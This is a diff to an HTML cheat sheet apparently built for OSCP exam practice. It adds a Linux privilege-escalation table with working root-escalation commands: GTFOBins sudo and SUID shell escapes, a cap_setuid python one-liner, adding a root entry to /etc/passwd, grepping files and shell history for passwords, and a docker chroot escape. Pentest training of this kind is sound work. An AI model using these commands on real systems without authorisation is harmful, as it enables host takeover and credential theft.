@@ -134,10 +134,24 @@ Set <b>&lt;KALI&gt;</b> = your tun0 IP. Full detail: <b>exam-harness/USAGE.md</b
 <section><div class=head><span class=num>4</span><h2>Privilege escalation</h2><span class=tag>manual — think it through</span></div>
 <div class=body>
 <pre>
-<span class="cmd nop c"># Linux</span>
-<span class=cmd>sudo -l<span class=c>                                   # GTFOBins any allowed binary</span></span>
+<span class="cmd nop c"># Linux enum</span>
+<span class=cmd>id ; sudo -l<span class=c>                              # who am I + what can I run as root</span></span>
 <span class=cmd>find / -perm -4000 -type f 2>/dev/null<span class=c>    # SUID</span></span>
 <span class=cmd>getcap -r / 2>/dev/null ; cat /etc/crontab</span>
+</pre>
+<p class=note><b>enum result → attack</b> — most OSCP Linux roots live in <code>sudo -l</code> or SUID. Check every binary at <b>gtfobins.github.io</b>.</p>
+<table class=ttbl>
+<tr><th>You find</th><th>Attack → root</th></tr>
+<tr><td>sudo -l entry</td><td>GTFOBins the exact binary. Classics: <code>sudo vim -c ':!/bin/sh'</code> · <code>sudo find . -exec /bin/sh \; -quit</code> · <code>sudo less /etc/profile</code>→<code>!/bin/sh</code> · env: <code>sudo LD_PRELOAD=/tmp/x.so cmd</code></td></tr>
+<tr><td>SUID binary (non-standard)</td><td>GTFOBins "SUID" section → e.g. <code>./find . -exec /bin/sh -p \; -quit</code> (note <code>-p</code>) · <code>cp</code>/<code>nano</code>/<code>base64</code> to read-or-write any file</td></tr>
+<tr><td>Capability <code>cap_setuid</code></td><td><code>getcap</code> shows it → GTFOBins, e.g. python: <code>os.setuid(0);os.system("/bin/sh")</code></td></tr>
+<tr><td>Root cron / writable script</td><td><code>pspy64</code> (watch 90s) → overwrite the script, or <b>$PATH hijack</b> if it calls a relative binary</td></tr>
+<tr><td>Writable <code>/etc/passwd</code></td><td>add root: <code>echo 'r:$1$x$<hash>:0:0::/root:/bin/bash' >>/etc/passwd</code> (openssl passwd -1)</td></tr>
+<tr><td>Creds in files / history</td><td><code>grep -riE 'pass|pwd' /var/www /opt /home 2>/dev/null</code> · <code>~/.bash_history</code> → <code>su</code> / ssh reuse</td></tr>
+<tr><td>Group: docker / lxd / disk</td><td>GTFOBins group escape, e.g. docker: <code>docker run -v /:/mnt -it alpine chroot /mnt sh</code></td></tr>
+</table>
+<p class=note><b>Gotchas:</b> SUID shell needs <code>-p</code> (else it drops privs). Stuck? Re-run as the <b>new</b> user. Kernel exploits (DirtyPipe/Cow) = <b>last</b> resort — config/creds/SUID first.</p>
+<pre>
 <span class="cmd nop c"># Windows</span>
 <span class=cmd>whoami /priv<span class=c>   # read the NAMES, not Enabled/Disabled</span></span>
 </pre>
